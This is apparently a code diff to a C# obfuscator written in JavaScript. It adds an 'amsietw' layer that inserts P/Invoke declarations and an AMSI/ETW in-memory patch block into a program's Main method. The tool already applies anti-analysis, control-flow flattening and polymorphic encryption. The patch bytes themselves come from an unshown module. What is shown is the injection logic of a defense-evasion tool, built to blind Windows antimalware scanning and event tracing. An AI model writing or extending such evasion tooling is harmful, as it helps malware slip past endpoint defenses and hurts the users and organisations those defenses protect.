@@ -14,6 +14,7 @@ import { toBase64, xorEncryptForLanguage } from '../utils/encoding'
 import { randomVarName, randomFuncName, generateDeadCode, randomXorKey } from '../utils/randomization'
 import { tokenize, tokensToCode, transformStrings, transformCodeOnly, hasUnicode, hasInterpolation, splitInterpolatedString, isSafeForInjection } from '../utils/parser'
 import { applyControlFlowFlattening } from './controlflow'
+import { generateCSAmsiEtwBlock } from './amsi'
 
 export function obfuscateCSharp(code, layers = []) {
   if (!code || code.trim().length === 0) return ''
@@ -37,6 +38,9 @@ export function obfuscateCSharp(code, layers = []) {
   }
   if (layers.includes('antianalysis')) {
     result = applyAntiAnalysis(result)
+  }
+  if (layers.includes('amsietw')) {
+    result = applyAmsiEtwPatch(result)
   }
   if (layers.includes('encrypt')) {
     result = applyEncryptionWrapper(result)
@@ -280,6 +284,36 @@ function applyAntiAnalysis(code) {
   }
 
   return '// Anti-analysis\n' + antiAnalysis + '\n' + code
+}
+
+/* ── AMSI/ETW In-Memory Patch ────────────────────────────── */
+
+function applyAmsiEtwPatch(code) {
+  const { patchCode, pInvokes } = generateCSAmsiEtwBlock()
+
+  // Add using System.Runtime.InteropServices if missing
+  let result = code
+  if (!result.includes('System.Runtime.InteropServices')) {
+    result = result.replace(/^(using System;)/m, '$1\nusing System.Runtime.InteropServices;')
+  }
+
+  // Insert P/Invoke declarations after class opening brace
+  const classMatch = result.match(/class\s+\w+[^{]*\{/)
+  if (classMatch) {
+    const classEnd = result.indexOf(classMatch[0]) + classMatch[0].length
+    result = result.substring(0, classEnd) + '\n' + pInvokes + '\n' + result.substring(classEnd)
+  }
+
+  // Insert patch code at start of Main method
+  const mainIndex = result.indexOf('static void Main')
+  if (mainIndex !== -1) {
+    const braceIndex = result.indexOf('{', mainIndex)
+    if (braceIndex !== -1) {
+      result = result.substring(0, braceIndex + 1) + '\n' + patchCode + '\n' + result.substring(braceIndex + 1)
+    }
+  }
+
+  return result
 }
 
 /* ── Polymorphic Encryption Wrapper (v4.5) ───────────────── */
